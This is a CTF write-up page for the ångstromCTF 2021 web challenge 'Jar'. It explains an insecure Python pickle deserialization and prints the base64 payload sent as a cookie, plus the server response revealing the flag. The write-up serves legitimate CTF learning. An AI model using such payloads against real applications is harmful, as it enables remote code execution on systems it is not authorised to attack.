<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>CTF Writeup</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>

    <link rel="stylesheet" href="/style.css"/>

  </head>

  <body>
    <!--Navigation Bar-->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
      <a class="navbar-brand" href="/index.html">Hackin7</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarText">
        <ul class="navbar-nav mr-auto">

          <li class="nav-item">
            <a class="nav-link" href="/about.html">About</a></li>
           <li><a class="nav-link" href="/achievements.html">Achievements</a></li>
           <li><a class="nav-link" href="/blog.html">Blog</a></li>
            <li><a class="nav-link" href="/links.html">CTF Writeups</a></li>
            <li><a class="nav-link" href="/all_projects.html">All Projects</a></li>
        </ul>
      </div>
    </nav>

    <div>
    
    <div class='content'>
    <link href='/css/github-css.css' rel='stylesheet' type='text/css'>
        <br>
        <a href='https://github.com/Hackin7/Programming-Crappy-Solutions/blob/master/Cyber Security/Capture the Flag Competitions/2021/Ã¥ngstromCTF/Web/Jar'>Original Github Link</a><br>
        <h1>Jar</h1>
<h3>Description</h3>
<p><img src="Description.png" alt="" /></p>
<h2>Solution</h2>
<p>Checking <a href="https://docs.python.org/3/library/pickle.html">https://docs.python.org/3/library/pickle.html</a>, we get a warning</p>
<pre><code>It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.
</code></pre>
<p>After that I researched on remote code exectuion using pickle, and coded up the solution. In short, it sends an object such that unpickling it will cause it to retrieve the flag and put it into the list. The website would then display the flag.</p>
<p>I initially found out how to cause remote code execution but I did not know how to display the flag. It was my teammate undefined_func who did it, so shout outs to him.</p>
<p>Running solve.py</p>
<pre><code>terminals database is inaccessible
gASVIgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwGW2ZsYWddlIWUUpQu
&lt;form method=&quot;post&quot; action=&quot;/add&quot; style=&quot;text-align: center; width: 100%&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;item&quot; placeholder=&quot;Item&quot;&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style=&quot;width: 100%; height: 100%&quot; src=&quot;/pickle.jpg&quot;&gt;&lt;div style=&quot;background-color: white; font-size: 3em; position: absolute; top: 74.30653705261622%; left: 44.16129903494589%;&quot;&gt;actf{you_got_yourself_out_of_a_pickle}&lt;/div&gt;
&lt;Response [200]&gt;
{'Content-Length': '375', 'Content-Type': 'text/html; charset=utf-8', 'Date': 'Wed, 07 Apr 2021 16:48:58 GMT', 'Server': 'Caddy, nginx/1.14.1'}
&lt;RequestsCookieJar[]&gt;
&lt;RequestsCookieJar[&lt;Cookie contents=gASVIgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwGW2ZsYWddlIWUUpQu for /&gt;]&gt;

Process returned 0 (0x0)	execution time : 2.403 s
Press [ENTER] to continue...
</code></pre>
<h2>Flag</h2>
<p><code>actf{you_got_yourself_out_of_a_pickle}</code></p>

    </div>
    
    </div>

  </body>
</html>